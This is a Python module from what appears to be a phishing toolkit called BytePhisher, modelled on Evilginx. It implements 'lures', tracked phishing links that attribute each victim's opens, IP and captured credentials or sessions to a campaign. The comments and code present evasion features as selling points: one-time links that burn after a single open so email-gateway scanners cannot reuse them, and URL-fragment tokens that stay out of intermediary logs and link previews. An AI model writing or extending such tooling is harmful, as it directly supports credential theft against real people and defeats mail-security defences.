# BytePhisher - lure management.
#
# A lure is one unique, tracked entry point into a campaign: a path like
# /l/8f3k2m1 (or a token inside the URL fragment) that maps to a phishlet, a
# campaign and optionally a specific target. Everything a victim does is
# attributed to the lure that brought them in:
#
#   * which lure was opened, from which IP, how many times
#   * which lure produced credentials / a captured session (conversion)
#   * one-time lures that burn after a single open (so a scanner that grabs the
#     link from an email gateway cannot reuse it)
#   * fragment lures: the token travels in the #fragment, so it never appears in
#     the server access log of any intermediary and cannot be scraped from a
#     mail gateway's link preview
#
# This is the Evilginx "lures" concept, extended with per-target labels,
# one-time semantics and conversion tracking that feeds the dashboard.
import random
import string
import time

ALPHABET = string.ascii_lowercase + string.digits
LURE_TYPES = ("link", "fragment", "one-time")


def _slug(n=7):
    return "".join(random.choice(ALPHABET) for _ in range(n))


class Lure:
    __slots__ = ("id", "token", "phishlet", "campaign", "label", "kind",
                 "max_uses", "uses", "created", "last_used", "opens",
                 "visitors", "conversions", "active", "meta", "notes")

    def __init__(self, id=None, token="", phishlet="", campaign="", label="",
                 kind="link", max_uses=0, uses=0, created=None, last_used=0,
                 opens=0, visitors=None, conversions=0, active=True, meta=None,
                 notes=""):
        self.id = id
        self.token = token or _slug(12)
        self.phishlet = phishlet
        self.campaign = campaign
        self.label = label
        self.kind = kind if kind in LURE_TYPES else "link"
        self.max_uses = int(max_uses or 0)          # 0 = unlimited
        self.uses = int(uses or 0)
        self.created = created or time.time()
        self.last_used = last_used or 0
        self.opens = int(opens or 0)
        self.visitors = list(visitors or [])
        self.conversions = int(conversions or 0)
        self.active = bool(active)
        self.meta = dict(meta or {})
        self.notes = notes

    # ---- semantics ----
    @property
    def burned(self):
        if not self.active:
            return True
        return bool(self.max_uses and self.uses >= self.max_uses)

    def url(self, base, fragment=False):
        """The full lure URL. Fragment lures keep the token out of request logs."""
        base = (base or "").rstrip("/")
        if fragment or self.kind == "fragment":
            return f"{base}/#l={self.token}"
        return f"{base}/l/{self.token}"

    def to_dict(self):
        return {"id": self.id, "token": self.token, "phishlet": self.phishlet,
                "campaign": self.campaign, "label": self.label, "kind": self.kind,
                "max_uses": self.max_uses, "uses": self.uses,
                "created": self.created, "last_used": self.last_used,
                "opens": self.opens, "visitors": len(self.visitors),
                "conversions": self.conversions, "active": self.active,
                "burned": self.burned, "meta": self.meta, "notes": self.notes}

    def describe(self):
        state = "burned" if self.burned else ("active" if self.active else "off")
        return (f"[{self.id}] {self.kind:<9} {state:<6} opens={self.opens:<4} "
                f"uniq={len(self.visitors):<4} conv={self.conversions:<3} "
                f"{self.phishlet}/{self.campaign or '-'} {self.label or ''}".rstrip())


# ---------------------------------------------------------------- helpers ---
def extract_token(path, query="", fragment=""):
    """Pull a lure token out of a path, query string or fragment payload.

    Fragment lures post the token back with the collector, so the JS side sends
    `{"lure": "<token>"}` - this helper accepts all three shapes.
    """
    import re
    for blob in (path or "", query or "", fragment or ""):
        m = re.search(r"/l/([A-Za-z0-9]{4,64})", blob)
        if m:
            return m.group(1)
        m = re.search(r"(?:^|[?&#])l=([A-Za-z0-9]{4,64})", blob)
        if m:
            return m.group(1)
    return ""

